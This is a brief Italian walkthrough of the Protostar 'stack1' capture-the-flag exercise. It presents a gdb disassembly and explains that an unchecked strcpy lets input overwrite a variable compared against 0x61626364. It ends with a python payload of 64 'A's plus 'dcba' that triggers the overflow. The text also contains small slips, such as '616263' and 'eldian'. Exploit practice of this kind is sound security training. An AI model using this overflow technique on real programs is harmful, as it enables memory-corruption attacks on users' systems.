````
proto@b92cf65f7998:/opt/protostar/bin$ gdb -q                                                      
(gdb) file stack1
Reading symbols from stack1...done.
(gdb) disass main
Dump of assembler code for function main:
   0x08048464 <+0>:	push   %ebp
   0x08048465 <+1>:	mov    %esp,%ebp
   0x08048467 <+3>:	and    $0xfffffff0,%esp
   0x0804846a <+6>:	sub    $0x60,%esp
   0x0804846d <+9>:	cmpl   $0x1,0x8(%ebp)
   0x08048471 <+13>:	jne    0x8048487 <main+35>
   0x08048473 <+15>:	movl   $0x80485a0,0x4(%esp)
   0x0804847b <+23>:	movl   $0x1,(%esp)
   0x08048482 <+30>:	call   0x8048388 <errx@plt>
   0x08048487 <+35>:	movl   $0x0,0x5c(%esp)
   0x0804848f <+43>:	mov    0xc(%ebp),%eax
   0x08048492 <+46>:	add    $0x4,%eax
   0x08048495 <+49>:	mov    (%eax),%eax
   0x08048497 <+51>:	mov    %eax,0x4(%esp)
   0x0804849b <+55>:	lea    0x1c(%esp),%eax
   0x0804849f <+59>:	mov    %eax,(%esp)
   0x080484a2 <+62>:	call   0x8048368 <strcpy@plt>
   0x080484a7 <+67>:	mov    0x5c(%esp),%eax
   0x080484ab <+71>:	cmp    $0x61626364,%eax
   0x080484b0 <+76>:	jne    0x80484c0 <main+92>
   0x080484b2 <+78>:	movl   $0x80485bc,(%esp)
   0x080484b9 <+85>:	call   0x8048398 <puts@plt>
   0x080484be <+90>:	jmp    0x80484d5 <main+113>
   0x080484c0 <+92>:	mov    0x5c(%esp),%edx
   0x080484c4 <+96>:	mov    $0x80485f3,%eax
   0x080484c9 <+101>:	mov    %edx,0x4(%esp)
   0x080484cd <+105>:	mov    %eax,(%esp)
   0x080484d0 <+108>:	call   0x8048378 <printf@plt>
   0x080484d5 <+113>:	leave  
   0x080484d6 <+114>:	ret    
End of assembler dump.
````
Da questa istruzione assembly possiamo notare che il main esegue un controllo se una var X ha come valore 616263 che in ascii è "abcd"
0x080484ab <+71>:	cmp    $0x61626364,%eax
Ricorda che siamo in little eldian, quindi la stringa sarà inviata come "dcba"
L'operazione di sottrazione è uguale a quella di #stack0
Il payload di attacco è il seguente:
````
./stack1 $(python3 -c 'print("A"*64 + "dcba")')
````

